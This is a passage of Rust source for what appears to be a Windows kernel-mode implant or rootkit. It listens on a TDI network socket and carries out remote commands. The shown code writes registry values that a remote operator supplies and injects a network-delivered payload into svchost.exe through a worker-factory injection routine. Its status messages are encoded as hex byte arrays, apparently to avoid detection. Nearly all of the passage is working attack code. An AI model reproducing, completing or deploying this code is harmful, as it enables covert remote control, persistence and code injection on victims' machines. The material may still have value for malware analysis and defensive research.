                            ntdef::macros::RtlCopyMemory(subkey_value as _, buf as _, buf_len as _);
                            subkey_value_buf_size = buf_len*2;    // needed for unicode
                        } else if key_type == ntdef::enums::REG_DWORD {
                            // assuming the value is sent as a string
                            *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
                            let subkey_value_raw = ntdef::macros::IntFromStr(buf as _);
                            subkey_value = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 4) as _;
                            (*subkey_value) = subkey_value_raw as _;
                            subkey_value_buf_size = 4;
                        } else if key_type == ntdef::enums::REG_BINARY {
                            buf_len = buf_len - 1;  // suppose we have newline at the end
                            subkey_value = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, buf_len as _) as _;
                            ntdef::macros::RtlCopyMemory(subkey_value as _, buf as _, buf_len as _);
                            subkey_value_buf_size = buf_len;
                        } else {
                            // can't enter in else branch because of the "matched" context, but rust forces to implement it
                            subkey_value = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 2 as _) as _;
                            subkey_value_buf_size = 1;
                        }
                        let status: u32 = ntreg::set_key(
                            reg_funcs, handle, subkey_name as _, subkey_name_buf_size as _, key_type as _,
                            subkey_value as _, subkey_value_buf_size as _
                        );
                        if status == 0 as _ {
                            let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
                            let _ = socket.send(&set_key_success_msg as *const u8, 16);
                        } else {
                            let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
                            let _ = socket.send(&set_key_error_msg as *const u8, 14);
                        }
                        ((*reg_funcs).ex_free_pool_with_tag)(subkey_value as _, 74);

                    } else {
                        let not_implemented_msg = [0x6eu8, 0x6fu8, 0x74u8, 0x20u8, 0x69u8, 0x6du8, 0x70u8, 0x6cu8, 0x65u8, 0x6du8, 0x65u8, 0x6eu8, 0x74u8, 0x65u8, 0x64u8, 0x0au8];
                        let _ = socket.send(&not_implemented_msg as *const u8, 16);
                    }

                    ((*reg_funcs).ex_free_pool_with_tag)(subkey_name as _, 73);

                    ntreg::close_handle(reg_funcs, handle);
                } else {
                    let key_create_error_msg = [0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x63u8, 0x72u8, 0x65u8, 0x61u8, 0x74u8, 0x65u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
                    let _ = socket.send(&key_create_error_msg as *const u8, 17);     
                }
            } else if ntdef::macros::RtlEqualMemory(buf as _, &usermode_cmd as _, 9) == 1u32 {
                // svchost.exe\x00
                let target_process_name = [0x73u8, 0x76u8, 0x63u8, 0x68u8, 0x6fu8, 0x73u8, 0x74u8, 0x2eu8, 0x65u8, 0x78u8, 0x65u8, 0x00u8];
                let usermode_payload: *mut u8 = (buf as *mut u8).offset(9) as _;
                let usermode_payload_size: u32 = buf_len - 9;
                /*
                // int3; ret                
                let usermode_payload = [0xccu8, 0xc3u8];
                let usermode_payload_size: u32 = 2;
                */
                // we keep the parameter for now even if not included in the protocol, it could be useful
                let usermode_routine_parameter = core::ptr::null_mut();

                /*
                // TODO: breakpoints could be injected using shellcode patching and this behaviour can be configured
                // for debugging
                asm!(
                    "int3"
                );
                */

                let status: u32 = ntuser::inject_worker_factory(
                    proc_funcs,
                    &target_process_name as *const u8 as _,
                    usermode_payload as *const u8 as _,
                    usermode_payload_size,
                    usermode_routine_parameter as _
                ) as _;
                
                if status == 0 as _ {
                    let injection_success_msg = [0x69u8, 0x6eu8, 0x6au8, 0x65u8, 0x63u8, 0x74u8, 0x69u8, 0x6fu8, 0x6eu8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
                    let _ = socket.send(&injection_success_msg as *const u8, 18);
                } else {
                    let injection_failure_msg = [0x69u8, 0x6eu8, 0x6au8, 0x65u8, 0x63u8, 0x74u8, 0x69u8, 0x6fu8, 0x6eu8, 0x20u8, 0x66u8, 0x61u8, 0x69u8, 0x6cu8, 0x75u8, 0x72u8, 0x65u8, 0x3au8, 0x20u8, 0x30u8 + status as u8, 0x0au8];
                    let _ = socket.send(&injection_failure_msg as *const u8, 21);
                }
            } else {
                let invalid_cmd = [0x69u8, 0x6eu8, 0x76u8, 0x61u8, 0x6cu8, 0x69u8, 0x64u8, 0x20u8, 0x63u8, 0x6fu8, 0x6du8, 0x6du8, 0x61u8, 0x6eu8, 0x64u8, 0x0au8];
                let _ = socket.send(&invalid_cmd as *const u8, 16 as _);
            }
            exec = 0 as _;
        }
    }
    (*tdi_ctx).msg_available = 1u32;    // to inhibit recv_handler
    // Doing these de-allocations causes bug check in the cleaning-up module
    /*
    ((*tdi_ctx).funcs.ex_free_pool_with_tag)(buf, 1);
    ((*tdi_ctx).funcs.ex_free_pool_with_tag)((*tdi_ctx).app_buffer as _, 2);
    // ((*tdi_ctx).funcs.ex_free_pool_with_tag)(scratch_buf, 3);
    */
    // _ = ((*tdi_ctx).funcs.ke_raise_irql_to_dpc_level)();
    ps_terminate_system_thread(ntdef::enums::NTSTATUS::STATUS_SUCCESS as _);
    Ok(())
}


#[inline]
unsafe fn recv_msg(tdi_ctx: *mut nttdi::TdiContext, buf: ntdef::types::PVOID)
-> (u32, u32) {
    while (*tdi_ctx).msg_available == 0u32 {
        asm!("nop");
    }

    let mut buf_len: u32 = 0;
    let mut exec: u32 = 0;

    if (*tdi_ctx).msg_available == 1u32 {
        buf_len = (*tdi_ctx).buf_len as _;
        ntdef::macros::RtlCopyMemory(buf as _, (*tdi_ctx).app_buffer as _, buf_len as _);
        exec = 1 as _;
        (*tdi_ctx).msg_available = 0u32;
    }
    return (buf_len, exec);
}

// called at DISPATCH_LEVEL
unsafe fn recv_handler(
    _tdi_event_context:      ntdef::types::PVOID,
    _connection_context:     ntdef::types::PVOID,
    _receive_flags:          ntdef::types::ULONG,
    _bytes_indicated:        ntdef::types::ULONG,
    bytes_available:        ntdef::types::ULONG,
    bytes_taken:            *mut ntdef::types::ULONG,
    _buffer:                 ntdef::types::PVOID,
    irp:                    *mut ntdef::structs::PIRP,
) -> ntdef::types::NTSTATUS {
    //core::intrinsics::breakpoint();

    *bytes_taken = bytes_available;
    *irp = core::ptr::null_mut();

    let tdi_ctx: *mut nttdi::TdiContext = _tdi_event_context as _;

    if (*tdi_ctx).msg_available == 0u32 {
        ntdef::macros::RtlCopyMemory((*tdi_ctx).app_buffer as _, _buffer as _, _bytes_indicated as _);
        (*tdi_ctx).buf_len = _bytes_indicated;
        (*tdi_ctx).msg_available = 1u32;
    }

    ntdef::enums::NTSTATUS::STATUS_SUCCESS as _
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {
    }
}
